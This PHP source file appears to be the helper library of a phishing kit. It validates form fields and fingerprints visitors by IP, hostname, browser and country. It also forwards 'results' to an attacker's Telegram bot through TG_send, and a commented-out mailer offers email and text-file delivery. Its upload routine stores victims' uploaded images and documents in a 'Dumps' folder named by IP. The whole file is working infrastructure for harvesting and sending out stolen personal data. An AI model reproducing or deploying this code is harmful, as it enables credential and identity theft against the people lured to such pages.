<?php

require_once "./settings/conf.php";

function is_invalid_class($array, $key)
{
    if (!is_array($array))
        return false;

    if (isset($array[$key])) {
        $return = 'has-error';
        return $return;
    }
    return false;
}

function error_message($array, $key) {
    if( !is_array($array) )
        return false;

    if( isset($array[$key]) ) {
        $return = '<div style="font-size:15px;font-weight:bold;color:red" class="error-message">'. $array[$key] .'</div>';// class="d-block error-message"
        return $return;
    }
    return false;
}



function get_value($value){
    if (isset($_SESSION[$value])) {
        return $_SESSION[$value];
    }
}

function get_selected_option($name, $value)
{
    if (isset($_SESSION[$name]) && $_SESSION[$name] == $value) {
        return 'selected';
    }
}



function validate_name($name)
{
    if (!preg_match('/^[\p{L} ]+$/u', $name))
        return false;
    return true;
}

function validate_email($email)
{
    if (!filter_var($email, FILTER_VALIDATE_EMAIL))
        return false;
    return true;
}

function validate_phone($phone, $len) {
    // Allow +, - and . in phone number
    $filtered_phone_number = filter_var($phone, FILTER_SANITIZE_NUMBER_INT);
    // Check the lenght of number
    // This can be customized if you want phone number from a specific country
    if (str_starts_with($filtered_phone_number, "0")) {
        if (strlen($filtered_phone_number) != $len) {
            return false;
        } else {
            return true;
        }
    } else {
        return false;
    }
}

function validate_number($number, $length = null)
{
    if (is_numeric($number)) {
        if ($length == null) {
            return true;
        } else {
            if ($length == strlen($number))
                return true;
            return false;
        }
    } else {
        return false;
    }
}

function validate_date($date, $format = 'Y-m-d H:i:s')
{
    $d = DateTime::createFromFormat($format, $date);
    return $d && $d->format($format) == $date;
}


function get_user_ip() {
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } else if (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }
    if ($ip == '::1') {
        return '127.0.0.1';
    }
    return  $ip;
}



/*function Email($subject, $message) {
    if (RECEIVE_VIA_TELEGRAM == 1) {
        telegram_message($message);
    }
    if (RESULTS_IN_TXT == 1) {
        file_put_contents(TXT_FILE_NAME, $message, FILE_APPEND);
    }
    if (RECEIVE_VIA_EMAIL == 1 && RECEIVE_VIA_SMTP == 1) {
        $mail = new PHPMailer;
        $mail->IsSMTP();
        $mail->Host = SMTP_HOSTNAME;
        $mail->Port = SMTP_PORT;
        $mail->SMTPAuth = true;
        $mail->Username = SMTP_USER;
        $mail->Password = SMTP_PASS;
        $mail->SMTPSecure = '';
        $mail->SMTPAutoTLS = false;
        $mail->From     = SMTP_FROM_EMAIL;
        $mail->FromName = '';
        $mail->Subject  = $subject;
        $mail->Body     = $message;
        $mail->AddAddress(RECEIVER);
        $mail->Send();
    } else {
        if (RECEIVE_VIA_EMAIL == 1) {
            $mail           = new PHPMailer;
            $mail->From     = 'localhost@resultat.com';
            $mail->FromName = '';
            $mail->Subject  = $subject;
            $mail->Body     = $message;
            $mail->AddAddress(RECEIVER);
            $mail->send();
            echo $mail->ErrorInfo;
        }
        if (RECEIVE_VIA_SMTP == 1) {
            $mail = new PHPMailer;
            $mail->IsSMTP();
            $mail->Host         = SMTP_HOSTNAME;
            $mail->Port         = SMTP_PORT;
            $mail->SMTPAuth     = true;
            $mail->Username     = SMTP_USER;
            $mail->Password     = SMTP_PASS;
            $mail->SMTPSecure   = '';
            $mail->SMTPAutoTLS  = false;
            $mail->From         = SMTP_FROM;
            $mail->FromName     = '';
            $mail->Subject      = $subject;
            $mail->Body         = $message;
            $mail->AddAddress(RECEIVER);
            $mail->Send();
        }
    }
}*/
include_once "detect.php";

function TG_send($msg,$token_api=null,$chat_id=null,$gr_chat_id=null){
    $text = $msg;

    $msgId = array(
        $chat_id,
        $gr_chat_id,
    );
    $token = array(
        $token_api,
        $token_api,
    );

    for ($i = 0; $i < count($msgId); $i++) {
        $url = "https://api.telegram.org/bot".$token[$i].'/sendMessage?chat_id='.$msgId[$i].'&text='.urlencode($text);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, True);
        $result = curl_exec($ch);
        curl_close($ch);
        $result_json = json_decode($result, True);
        if(isset($result_json['ok'])){
            if(isset($result_json['result'])){
                echo "";
            }else {
                //echo $result_json['description'];
                echo "";
            }
        }else {
            //echo "Something went wrong";
            echo "";
        }
    }
}

function visitors() {
    $detect          = new BrowserDetection();
    $ip              = get_user_ip();
    $date            = date("Y-m-d H:i:s", time());
    $hostname        = gethostbyaddr(get_user_ip());
    $usragent        = $_SERVER['HTTP_USER_AGENT'];
    $browserName     = $detect->getName();
    $browserVer      = $detect->getVersion();
    $isMobile        = ($detect->isMobile()) ? 'Mobile' : 'Not mobile';
    $platformName    = $detect->getPlatform();
    $platformVer     = $detect->getPlatformVersion();
    $country         = get_user_country();


    $info = " <tr> 
                <th scope='row'>$ip [$country]</th>  
                <th>$hostname</th>
                <td>$date</td> 
                <td>$usragent</td> 
                <td>[$isMobile] $browserName $browserVer </td> 
                <th>$platformName</th>
                <th>$platformVer</th>
            </tr>";

    file_put_contents('visitors.html', $info, FILE_APPEND | LOCK_EX);
    $tg_info = array($ip, $isMobile, $country, $hostname, $usragent, $browserName, $browserVer, $platformName, $platformVer);
    return $tg_info;
}


function get_user_os() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
        '/windows nt 10/i'      =>  'Windows 10',
        '/windows nt 6.3/i'     =>  'Windows 8.1',
        '/windows nt 6.2/i'     =>  'Windows 8',
        '/windows nt 6.1/i'     =>  'Windows 7',
        '/windows nt 6.0/i'     =>  'Windows Vista',
        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     =>  'Windows XP',
        '/windows xp/i'         =>  'Windows XP',
        '/windows nt 5.0/i'     =>  'Windows 2000',
        '/windows me/i'         =>  'Windows ME',
        '/win98/i'              =>  'Windows 98',
        '/win95/i'              =>  'Windows 95',
        '/win16/i'              =>  'Windows 3.11',
        '/macintosh|mac os x/i' =>  'Mac OS X',
        '/mac_powerpc/i'        =>  'Mac OS 9',
        '/linux/i'              =>  'Linux',
        '/ubuntu/i'             =>  'Ubuntu',
        '/iphone/i'             =>  'iPhone',
        '/ipod/i'               =>  'iPod',
        '/ipad/i'               =>  'iPad',
        '/android/i'            =>  'Android',
        '/blackberry/i'         =>  'BlackBerry',
        '/webos/i'              =>  'Mobile'
    );
    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }
    return $os_platform;
}

function get_user_browser() {
    $user_agent     = $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
        '/msie/i'       =>  'Internet Explorer',
        '/firefox/i'    =>  'Firefox',
        '/safari/i'     =>  'Safari',
        '/chrome/i'     =>  'Chrome',
        '/opera/i'      =>  'Opera',
        '/netscape/i'   =>  'Netscape',
        '/maxthon/i'    =>  'Maxthon',
        '/konqueror/i'  =>  'Konqueror',
        '/mobile/i'     =>  'Handheld Browser'
    );
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}

function get_user_country() {
    $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . get_user_ip() . ""));
    if ($details && $details->geoplugin_countryName != null) {
        $countryname = $details->geoplugin_countryName;
    }
    return $countryname;
}

function get_user_countrycode() {
    $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" .  get_user_ip() . ""));
    if ($details && $details->geoplugin_countryCode != null) {
        $countrycode = $details->geoplugin_countryCode;
    }
    return $countrycode;
}

function upload_file($file, $name) {
    $target_dir     = "Dumps/";
    $target_file    = $target_dir . basename($file["name"]);
    $imageFileType  = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
    $check          = getimagesize($file["tmp_name"]);
    if ($check == false) {
        return false;
    }
    if (
        $imageFileType !== "jpg" && $imageFileType !== "png" && $imageFileType !== "jpeg"
        && $imageFileType !== "pdf"
    ) {
        return false;
    }
    if (move_uploaded_file($file["tmp_name"], 'Dumps/' . get_user_ip() . '-' . $name . '.' . $imageFileType)) {
        return get_user_ip() . '-' . $name . '.' . $imageFileType;
    } else {
        return false;
    }
}

function create() {
    $letters  = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    $length   = strlen($letters) - 1;
    $random   = "";
    for ($p = 0; $p < 6; $p++) {
        $random .= $letters[mt_rand(0, $length)];
    }
    $randomFile = 'Dumps/' . $random . '.php';
    $file = fopen($randomFile, "w");
    return ['file' => $file, 'name' => $random . '.php', 'path' => $randomFile];
}

/* function go($page) {
    $create = create();
    $content = file_get_contents(TEMPLATES . $page . '.txt');
    fwrite($create['file'], $content);
    fclose($create['file']);
    $_SESSION[$page . '_path'] = $create['path'];
    return $create;
} */
